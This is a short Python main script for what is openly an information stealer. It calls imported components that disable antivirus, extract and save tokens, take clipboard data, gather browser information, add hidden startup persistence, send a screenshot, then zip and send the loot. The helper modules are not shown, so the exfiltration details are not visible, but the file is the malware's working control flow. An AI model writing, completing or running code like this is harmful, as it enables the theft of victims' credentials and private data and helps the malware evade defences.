import threading, time
from components.wtoken import TokenExtractor
from browsers.browserinfo import getinfo
from components.zipandsend import zipnsend
from components.info import send_screenshot
from components.clipboard import steal_data
from components.startup import hiddenstartup
from components.confirmsend import confirmsend
from components.antiantivirus import antiantivirus
def browser():
    threading.Thread(target=getinfo).start()
    threading.Thread(target=hiddenstartup).start()
antiantivirus()
token_extractor = TokenExtractor()
token_extractor.save_tokens()
steal_data()
browser()
send_screenshot()
confirmsend()
time.sleep(1)
zipnsend()